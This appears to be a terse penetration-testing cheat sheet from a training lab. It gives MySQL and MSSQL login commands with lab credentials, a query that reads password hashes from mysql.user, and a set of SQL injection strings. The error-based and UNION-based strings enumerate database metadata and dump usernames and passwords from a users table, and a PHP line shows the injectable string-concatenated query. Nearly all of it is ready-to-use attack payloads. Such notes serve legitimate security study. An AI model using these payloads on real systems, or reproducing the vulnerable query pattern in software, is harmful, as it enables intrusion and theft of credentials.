### mysql

mysql -u root -p'root' -h 192.168.50.16 -P 3306

SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';


### mssql

impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth -port 1433

SELECT @@version;

SELECT name FROM sys.databases;

SELECT * FROM offsec.information_schema.tables;

select * from offsec.dbo.users;


### site injection
**in username field

whatever' 1=1 in (select @@version) -- //

' or 1=1 in (SELECT password FROM users) -- //

' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //

## UNION based
**search field

$query = "SELECT * from customers WHERE name LIKE '".$_POST["search_input"]."%'";

' ORDER BY 1-- //

%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //

%' UNION SELECT database(), user(), @@version, null, null -- //

' UNION SELECT null, null, database(), user(), @@version  -- //

' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

' UNION SELECT null, username, password, description, null FROM users -- //

